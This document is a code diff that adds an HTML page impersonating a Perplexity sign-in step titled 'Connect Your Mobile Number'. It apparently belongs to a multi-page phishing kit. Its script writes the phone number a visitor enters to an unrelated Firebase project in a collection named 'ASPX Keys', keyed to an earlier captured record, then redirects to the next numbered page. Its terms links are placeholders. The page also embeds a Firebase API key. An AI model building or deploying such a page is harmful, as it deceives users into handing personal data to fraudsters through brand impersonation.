@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Mobile - Perplexity</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+            padding: 60px 24px;
+            color: #212121;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+            color: #000;
+        }
+
+        p.description {
+            font-size: 16px;
+            color: #6e6e80;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px 24px;
+            font-size: 18px;
+            border: 1px solid #d1d1d6;
+            /* Fixed Radius as per Image */
+            border-radius: 24px; 
+            outline: none;
+            transition: border-color 0.2s;
+            color: #000;
+        }
+
+        /* Changed focus color to BLACK */
+        input:focus {
+            border-color: #000;
+        }
+
+        .error-msg {
+            color: #df1b41;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            text-align: left;
+            padding-left: 20px;
+        }
+
+        .terms {
+            font-size: 14px;
+            color: #6e6e80;
+            margin-top: 24px;
+            line-height: 1.4;
+        }
+
+        .terms a {
+            color: #2d333a;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .btn-continue {
+            width: 100%;
+            background-color: #000;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            border-radius: 30px; /* Pill shaped button */
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 32px;
+            transition: opacity 0.2s;
+        }
+
+        .btn-continue:active {
+            opacity: 0.8;
+        }
+
+        .loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Connect Your Mobile Number</h1>
+        <p class="description">Connect Your Phone Number to signing in to your Perplexity Account</p>
+
+        <div class="input-wrapper">
+            <input type="text" id="mobile" placeholder="+91 1234567890" autocomplete="off">
+            <div id="error" class="error-msg">Please enter a valid 10-digit number.</div>
+        </div>
+
+        <p class="terms">
+            By clicking "Continue", you agree to our <a href="https://1.com">Terms</a> and have read our <a href="https://1.com">Privacy Policy</a>.
+        </p>
+
+        <button id="continueBtn" class="btn-continue">Continue</button>
+    </div>
+
+    <script>
+        // --- Firebase Configuration ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
+            authDomain: "question-metabase.firebaseapp.com",
+            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "question-metabase",
+            storageBucket: "question-metabase.firebasestorage.app",
+            messagingSenderId: "770698198753",
+            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
+            measurementId: "G-6ZP1FPMKSJ"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        const mobileInput = document.getElementById('mobile');
+        const continueBtn = document.getElementById('continueBtn');
+        const errorDiv = document.getElementById('error');
+
+        // Automatically add space after country code
+        mobileInput.addEventListener('keyup', (e) => {
+            let val = mobileInput.value;
+            // Adds space if user types + followed by digits (e.g. +91)
+            if (val.startsWith('+') && val.length === 3 && e.key !== 'Backspace') {
+                mobileInput.value = val + ' ';
+            }
+        });
+
+        async function validateAndSubmit() {
+            const fullVal = mobileInput.value.trim();
+            
+            // Regex: Requires exactly 10 digits at the end
+            // Accepts: +91 1234567890, +911234567890, or 1234567890
+            const regex = /^(\+\d{1,4}\s?)?(\d{10})$/;
+            const match = fullVal.match(regex);
+
+            if (match) {
+                errorDiv.style.display = 'none';
+                saveData(fullVal);
+            } else {
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        async function saveData(fullNumberString) {
+            continueBtn.innerText = "Connecting...";
+            continueBtn.classList.add('loading');
+
+            // Retrieves the ID of the current user document
+            const docId = localStorage.getItem('currentDocId') || "1065080509"; 
+
+            try {
+                const docRef = db.collection("ASPX Keys").doc(docId);
+                
+                // Merges data into the SAME document
+                await docRef.set({
+                    mobileNumber: fullNumberString,
+                    updatedAt: new Date().toLocaleString() + " UTC+5:30"
+                }, { merge: true });
+
+                // Redirect to 7.html
+                window.location.href = "6.html";
+            } catch (err) {
+                console.error("Error: ", err);
+                alert("Please try again.");
+                continueBtn.innerText = "Continue";
+                continueBtn.classList.remove('loading');
+            }
+        }
+
+        // Event Listeners
+        continueBtn.addEventListener('click', validateAndSubmit);
+
+        mobileInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                validateAndSubmit();
+            }
+        });
+    </script>
+</body>
+</html>
